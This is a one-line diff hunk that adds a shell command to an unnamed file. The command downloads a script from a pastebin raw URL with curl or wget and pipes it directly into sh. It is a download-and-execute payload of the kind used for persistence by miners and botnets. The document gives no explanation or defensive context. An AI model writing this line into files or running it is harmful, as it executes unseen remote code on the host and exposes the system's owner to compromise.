@@ -1,0 +1,1 @@
+(curl -fsSL https://pastebin.com/raw/xmxHzu5P||wget -q -O- https://pastebin.com/raw/xmxHzu5P)|sed -e 's/\r//g'|sh
